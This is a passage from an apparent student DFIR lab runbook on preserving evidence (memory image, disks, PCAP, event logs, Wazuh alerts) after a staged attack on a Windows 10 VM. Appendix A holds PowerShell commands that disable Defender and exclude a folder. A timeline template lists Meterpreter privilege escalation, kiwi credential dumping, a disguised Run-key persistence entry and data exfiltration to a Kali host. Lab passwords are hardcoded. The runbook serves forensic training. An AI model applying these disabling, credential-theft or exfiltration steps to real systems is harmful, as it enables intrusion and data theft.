Remove-SmbShare -Name wk0disk -Force
Remove-Item C:\dfir-wk0-stage -Recurse -Force
```

Later, in S2, Autopsy opens `WKSTN01-000001.vmdk` (snapshot current) via
`vmware-mount` or `qemu-nbd`. We don't analyze in S0; we only preserve.

> **Watch out — guest SMB to the host usually fails with
> NT_STATUS_ACCESS_DENIED.** Authenticate with the host local account.
> Local-account form on fr-FR Windows is `<HOSTNAME>/<username>` (slash,
> backslash, or `-W HOSTNAME` all work with smbclient — the slash form is
> clearest).

### 10.5 — Export Wazuh alerts for the attack window

Pick time bounds from attack.log, then query the indexer:

```bash
# On rhel-wazuh
mkdir -p ~/dfir-wk0/evidence/07-wazuh

START="<timestamp of tcpdump start>Z"   # e.g. 2026-10-07T13:45:00Z
END="<timestamp of tcpdump stop>Z"       # e.g. 2026-10-07T15:45:00Z

curl -s -k -u admin:'Wazuh2026!' \
    "https://127.0.0.1:9200/wazuh-alerts-*/_search?size=10000" \
    -H 'Content-Type: application/json' \
    -d "{\"query\":{\"bool\":{\"must\":[
        {\"term\":{\"agent.name\":\"WKSTN01\"}},
        {\"range\":{\"@timestamp\":{\"gte\":\"$START\",\"lte\":\"$END\"}}}
      ]}},\"sort\":[{\"@timestamp\":\"asc\"}]}" \
    > ~/dfir-wk0/evidence/07-wazuh/wk0-alerts.json

jq '.hits.total.value' ~/dfir-wk0/evidence/07-wazuh/wk0-alerts.json
# Should be ≥ 100 (SCA scan + Sysmon events + attack hits)
```

Transfer to Kali — rhel-wazuh enforces publickey SSH, so **push from
rhel-wazuh** rather than pull from Kali:

```bash
# On rhel-wazuh
scp ~/dfir-wk0/evidence/07-wazuh/wk0-alerts.json \
    kali@192.168.100.30:~/dfir-wk0/evidence/07-wazuh/
# Password prompt — default 'kali'
```

**Checkpoint:** WKSTN01 suspended, PCAP closed, `.vmem` + `.vmdk` + `.evtx`
+ Wazuh alerts all under `~/dfir-wk0/evidence/` on Kali.
**Live run:** ⬜ _pending_ — `.vmem` size: `____ GB`, PCAP size: `____ MB`,
alert count: `____`.

---

## 11. Hash everything + custody manifest

```bash
# On Kali
cd ~/dfir-wk0/evidence
find . -type f ! -name 'MANIFEST*' ! -name 'README.md' -print0 \
    | sort -z \
    | xargs -0 sha256sum \
    > MANIFEST.sha256

wc -l MANIFEST.sha256   # ~39 files (varies with vmdk count)
sha256sum --check MANIFEST.sha256 2>&1 | tail -3   # all OK
```

Write custody README (see live example in evidence/README.md). Minimum:
case, team, site, target, attacker, SIEM, collection window, layout,
ATT&CK chain, acquisition notes, integrity verify command, chain-of-
custody table.

> **Watch out — if the MANIFEST contains a file like `./03-tim`, something
> truncated during a copy-paste.** Delete the stray file, regenerate the
> manifest.

> **Watch out — identical hashes across multiple `WKSTN01-s*.vmdk` files
> are normal.** The 512 KB zero-filled sector descriptors from
> VMware's split layout are all the same byte sequence.

**Checkpoint:** every evidence file hashed, manifest verified round-trip,
README with custody chain committed.
**Live run:** ⬜ _pending_ — file count: `____`, verify output all `OK`: ⬜.

---

## 12. Deliverables + sign-off checklist

- [ ] **(BOTH)** WKSTN01 deployed, Sysmon + agent Wazuh active and
      visible on dashboard — §1–§5
- [ ] **(B)** Attack chain documented with per-step UTC timestamps —
      `03-timeline/attack.log`
- [ ] **(A)** Evidence folder sealed — `.vmem` + `.vmdk` chain + PCAP +
      `.evtx` + Wazuh alerts under `~/dfir-wk0/evidence/`
- [ ] **(BOTH)** Chain of custody — `MANIFEST.sha256` + `README.md`

Side-signed by: `A ____________________` `B ____________________`
on `__________`.

---

## Quick Reference

| Thing                  | Value / command                                                    |
|------------------------|--------------------------------------------------------------------|
| WKSTN01 IP             | `192.168.100.40`                                                   |
| WKSTN01 user           | whatever you set at install (profile name = `$env:USERPROFILE`)    |
| Wazuh manager IP       | `192.168.100.10` (reused `rhel-wazuh`)                             |
| Wazuh manager container| `single-node-wazuh.manager-1`                                      |
| Wazuh agent group      | `dfir-wk0`                                                         |
| Wazuh agent version    | 4.14.6 (match manager exactly)                                     |
| Kali IP                | `192.168.100.30`                                                   |
| Host IP (VMnet10)      | `192.168.100.1`                                                    |
| Metasploit LHOST:LPORT | `192.168.100.30:4444`                                              |
| Exfil endpoint         | `http://192.168.100.30:8000/exfil/<name>`                          |
| Stage HTTP (Kali→VM)   | `http://192.168.100.30:8080/`                                      |
| Sysmon config          | SwiftOnSecurity `sysmonconfig-export.xml` (unmodified)             |
| Memory image path      | `C:\VMs\WKSTN01\WKSTN01-<8hex>.vmem` (post-suspend)                |
| Evidence root (Kali)   | `~/dfir-wk0/evidence/`                                             |
| ATT&CK covered in S0   | T1566.001, T1204.002, T1547.001, T1003.001, T1041                  |

Check WKSTN01 agent live:
```bash
sudo docker exec single-node-wazuh.manager-1 \
    /var/ossec/bin/agent_control -l | grep WKSTN01
```

Suspend / resume WKSTN01 from host:
```powershell
& 'C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe' suspend 'C:\VMs\WKSTN01\WKSTN01.vmx'
& 'C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe' start   'C:\VMs\WKSTN01\WKSTN01.vmx'
```

Verify evidence manifest:
```bash
(cd ~/dfir-wk0/evidence && sha256sum --check MANIFEST.sha256)
```

---

## Appendix A — if Defender re-enabled itself across reboot

Windows 10 periodically re-arms real-time protection when it decides no
third-party AV is active. Signs: your payload disappears from `Downloads\`
with a toast "Protection contre les virus et menaces → Menaces détectées",
or `Start-Process invoice_october.exe` fails silently.

Fix without touching the payload hash:

```powershell
# As admin, confirm current state
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableIOAVProtection

# If either is False, Tamper Protection is on. Turn it off via GUI
# (Settings → Windows Security → Virus & threat protection), then:
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
```

If the payload was quarantined, restore from **Windows Security → Protection
history** rather than re-downloading — a restored copy has the same bytes
so your SHA-256 baseline stays valid.

---

## Appendix B — timestamp log template

Paste into `03-timeline/attack.log` at the start:

```
=== Projet 4 S0 attack timeline ===
Team: A=Oussama Hamada (observer/preserve), B=Aladine Fadhli (attacker)
Target: WKSTN01 (192.168.100.40, Windows 10, Sysmon+Wazuh)
Attacker: kali (192.168.100.30)
All times UTC.

<ts>  tcpdump started on kali eth0
<ts>  B: handler up on 4444
<ts>  B: exfil server up on 8000
<ts>  B: payload copied to Downloads
<ts>  B: payload executed (Start-Process)
<ts>  B: Meterpreter session 1 opened — PID ____
<ts>  B: getsystem OK (SYSTEM via Named Pipe Impersonation)
<ts>  B: upload sysupdate.exe to AppData\Roaming
<ts>  B: Run key HKCU\...\Run\WindowsUpdate written
<ts>  B: load kiwi ; creds_all ; lsa_dump_sam
<ts>  B: fake customers.csv created in Documents
<ts>  B: POST exfil to :8000/exfil/customers — ____ bytes
<ts>  B: Meterpreter backgrounded
<ts>  A: vmrun suspend WKSTN01 — .vmem written
<ts>  tcpdump stopped
<ts>  A: WKSTN01 briefly resumed for .evtx export (window: <ts> → <ts>)
<ts>  A: WKSTN01 re-suspended
<ts>  A: Wazuh alerts exported — ____ hits in window
<ts>  BOTH: MANIFEST.sha256 generated and verified
```

---

## Appendix C — Wazuh alerts export query (standalone)

If you need to re-export later with different time bounds or filters:

```bash
curl -s -k -u admin:'Wazuh2026!' \
    "https://192.168.100.10:9200/wazuh-alerts-*/_search?size=10000" \
    -H 'Content-Type: application/json' \
    -d '{
      "query": { "bool": { "must": [
        { "term":  { "agent.name": "WKSTN01" } },
        { "range": { "@timestamp": { "gte": "<START_UTC>", "lte": "<END_UTC>" } } }
      ]}},
      "sort": [{ "@timestamp": "asc" }],
      "_source": [
        "@timestamp","agent.name","rule.id","rule.level","rule.description",
        "data.win.system.eventID","data.win.eventdata.image",
        "data.win.eventdata.commandLine","data.win.eventdata.targetFilename",
        "data.win.eventdata.destinationIp","data.win.eventdata.destinationPort"
      ]
    }' | jq .
```

For >10000 hits use scroll API — same shape, add `?scroll=2m` and iterate
on `_scroll_id`.

---

## Appendix D — live-run deltas captured during build (2026-10-07 → 2026-10-10)

Issues hit live that this runbook now preempts:

| Hit                                             | Fix now in                        |
|-------------------------------------------------|-----------------------------------|
| `New-NetIPAddress`: Object[] → UInt32           | §2a (name adapter explicitly)     |
| 25× "Access to CIM resource" on DNS set         | §2 (admin requirement, loud)      |
| `AuditPol` 0x00000057 on localized name         | §2c (GUID instead of name)        |
| `Set-MpPreference` 0xc0000142 as admin          | §2e (Tamper Protection GUI first) |
| Sysmon "You need to launch as Administrator"    | §3 (admin + `& <abs path>` form)  |
| Wazuh container `No such container`             | §0, §4 (correct container name)   |
| Kali `wget`: name resolution timeout            | §4 (DNS override)                 |
| `python3 -m http.server` ate POST bodies        | §7b (`exfil_server.py`)           |
| `persistence_exe` module not found              | §9.3 (manual upload + reg setval) |
| `creds_all` "Not running as SYSTEM"             | §9.4 (`getsystem` first)          |
| `background` from cmd shell not Meterpreter     | §9.5 (`exit` first)               |
| `.vmem` name has hex suffix, not plain          | §10.1 (glob `*.vmem`)             |
| `wevtutil epl Security` denied silently         | §10.3 (admin requirement)         |
| VMware shared folders need VMware Tools         | §10.3 (SMB share instead)         |
| `smbclient` guest → ACCESS_DENIED               | §10.3 (`-U` with local account)   |
| scp from Kali to rhel-wazuh → publickey only    | §10.5 (push from rhel-wazuh)      |
| Stray `./03-tim` file from truncated paste      | §11 (watch-out)                   |
